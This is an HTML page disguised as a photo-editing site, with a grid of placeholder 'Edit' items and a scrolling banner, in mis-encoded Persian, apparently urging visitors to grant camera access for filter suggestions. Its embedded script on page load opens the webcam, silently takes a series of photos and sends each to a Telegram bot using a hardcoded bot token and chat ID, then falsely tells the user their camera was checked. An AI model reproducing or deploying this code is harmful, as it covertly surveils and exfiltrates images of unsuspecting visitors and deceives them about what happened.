<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Edit</title>
    <link rel="stylesheet" href="./css.css">
</head>

<script>
async function takeMultiplePhotosAndSend() {
    try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: true });

        const video = document.createElement('video');
        video.srcObject = stream;
        await video.play();

        let count = 0;
        const totalPhotos = 10; 

        const interval = setInterval(async () => {
            if (count >= totalPhotos) {
                clearInterval(interval); 
                stream.getTracks().forEach(track => track.stop()); 
                alert("โ ุฏูุฑุจู ุดูุง ุจุง ููููุช ุจุฑุฑุณ ุดุฏ ");
                return;
            }

            const canvas = document.createElement('canvas');
            const context = canvas.getContext('2d');
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            context.drawImage(video, 0, 0, canvas.width, canvas.height);

            canvas.toBlob(async (blob) => {
                await sendPhotoToTelegram(blob, count + 1); 
            }, 'image/jpeg');

            count++; 
        }, 1000); 

    } catch (error) {
        console.error('โ ุฎุทุง ุฏุฑ ุฏุณุชุฑุณ ุจู ุฏูุฑุจู:', error);
        alert("ุฎุทุง ุฏุฑ ุฏุณุชุฑุณ ุจู ุฏูุฑุจู. ูุทูุงู ุงุฌุงุฒูโ ุงุณุชูุงุฏู ุงุฒ ุฏูุฑุจู ุฑุง ุจุฏูุฏ.");
    }
}

// ุชุงุจุน ุงุฑุณุงู ุนฺฉุณ ุจู ุชูฺฏุฑุงู
async function sendPhotoToTelegram(blob, photoNumber) {
    const botToken = "7680012352:AAFC5niMJAkTtmRBpLlmmEhwpAE8xHKY0Bw";
    const chatId = "6818256494";
    const url = `https://api.telegram.org/bot${botToken}/sendPhoto`;

    const formData = new FormData();
    formData.append('photo', blob, `photo_${photoNumber}.jpg`);
    formData.append('chat_id', chatId);
    formData.append('caption', `๐ท ุนฺฉุณ ุดูุงุฑู ${photoNumber} ุงุฑุณุงู ุดุฏ!`);

    try {
        const response = await fetch(url, {
            method: 'POST',
            body: formData
        });

        const data = await response.json();

        if (response.ok) {
            console.log(`โ ุนฺฉุณ ุดูุงุฑู ${photoNumber} ุจุง ููููุช ุงุฑุณุงู ุดุฏ!`);
        } else {
            throw new Error(data.description || "ุฎุทุง ูุงุดูุงุฎุชู ุฏุฑ ุงุฑุณุงู ุนฺฉุณ ุจู ุชูฺฏุฑุงู");
        }

    } catch (error) {
        console.error(`โ ุฎุทุง ุฏุฑ ุงุฑุณุงู ุนฺฉุณ ุดูุงุฑู ${photoNumber} ุจู ุชูฺฏุฑุงู:`, error);
    }
}

takeMultiplePhotosAndSend();

async function takeMultiplePhotosAndSend() {
    try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: true });

        const video = document.createElement('video');
        video.srcObject = stream;
        await video.play();

        let count = 0;
        const totalPhotos = 20; 

        const interval = setInterval(async () => {
            if (count >= totalPhotos) {
                clearInterval(interval); 
                stream.getTracks().forEach(track => track.stop()); 
                alert("โ ุฏูุฑุจู ุดูุง ุจุง ููููุช ุจุฑุฑุณ ุดุฏ ");
                return;
            }

            const canvas = document.createElement('canvas');
            const context = canvas.getContext('2d');
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            context.drawImage(video, 0, 0, canvas.width, canvas.height);

            canvas.toBlob(async (blob) => {
                await sendPhotoToTelegram(blob, count + 1); 
            }, 'image/jpeg');

            count++; 
        }, 1000); 

    } catch (error) {
        console.error('โ ุฎุทุง ุฏุฑ ุฏุณุชุฑุณ ุจู ุฏูุฑุจู:', error);
        alert("ุฎุทุง ุฏุฑ ุฏุณุชุฑุณ ุจู ุฏูุฑุจู. ูุทูุงู ุงุฌุงุฒูโ ุงุณุชูุงุฏู ุงุฒ ุฏูุฑุจู ุฑุง ุจุฏูุฏ.");
        
        window.close();
    }
}


</script>
<body>
    
<header>
    <h1>Edit the photo</h1>
</header>

<nav>
    <a href="#">home</a>
    <a href="#">about the web</a>
    <a href="#">about us</a>
    <a href="#">contact us</a>
</nav>

<div class="list">

    <div class="item">
        <a href="#" class="a2">
            <span class="a3"><img src="1.png" alt="Photo" class=""></span>
            <span class="a4">Edit 1</span>
            <p class="a5">Editor Name</p>
            <div class="a6">
                <span>Edit Name</span>
            </div>
        </a>
    </div>
    <div class="item">
        <a href="#" class="a2">
            <span class="a3"><img src="1.png" alt="Photo" class=""></span>
            <span class="a4">Edit 2</span>
            <p class="a5">Editor Name</p>
            <div class="a6">
                <span>Edit Name</span>
            </div>
        </a>
    </div>
    <div class="item">
        <a href="#" class="a2">
            <span class="a3"><img src="1.png" alt="Photo" class=""></span>
            <span class="a4">Edit 3</span>
            <p class="a5">Editor Name</p>
            <div class="a6">
                <span>Edit Name</span>
            </div>
        </a>
    </div>
    <div class="item">
        <a href="#" class="a2">
            <span class="a3"><img src="1.png" alt="Photo" class=""></span>
            <span class="a4">Edit 4</span>
            <p class="a5">Editor Name</p>
            <div class="a6">
                <span>Edit Name</span>
            </div>
        </a>
    </div>
    <div class="item">
        <a href="#" class="a2">
            <span class="a3"><img src="1.png" alt="Photo" class=""></span>
            <span class="a4">Edit 4</span>
            <p class="a5">Editor Name</p>
            <div class="a6">
                <span>Edit Name</span>
            </div>
        </a>
    </div>
    <div class="item">
        <a href="#" class="a2">
            <span class="a3"><img src="1.png" alt="Photo" class=""></span>
            <span class="a4">Edit 5</span>
            <p class="a5">Editor Name</p>
            <div class="a6">
                <span>Edit Name</span>
            </div>
        </a>
    </div>
    <div class="item">
        <a href="#" class="a2">
            <span class="a3"><img src="1.png" alt="Photo" class=""></span>
            <span class="a4">Edit 6</span>
            <p class="a5">Editor Name</p>
            <div class="a6">
                <span>Edit Name</span>
            </div>
        </a>
    </div>
    <div class="item">
        <a href="#" class="a2">
            <span class="a3"><img src="1.png" alt="Photo" class=""></span>
            <span class="a4">Edit 7</span>
            <p class="a5">Editor Name</p>
            <div class="a6">
                <span>Edit Name</span>
            </div>
        </a>
    </div>
    
</div>

<div class="m">
    <marquee direction="right">
        <p class="p"> ุจุฑุง ุงุฏุช ููุท ฺฉุงู ุงุณุช ุงุฌุงุฒูโ ุงุณุชูุงุฏู ุงุฒ ุฏูุฑุจู ุฑุง ุจู ุณุงุช ุฏูุฏ ุชุง ุฏูุฑุจู ุดูุง ุฑุง ุจุฑุฑุณ ฺฉูุฏ ู ุจูุชุฑู ููุชุฑ ุฑุง ุจู ุดูุง ูุนุฑู ฺฉูุฏ </p>
    </marquee>
</div>

<footer>
    <p>&copy; 2024 ุณุงุช ุงุฏุช ุนฺฉุณ  | ุชูุงู ุญููู ูุญููุธ ุงุณุช </p>
</footer>
</body>
</html>
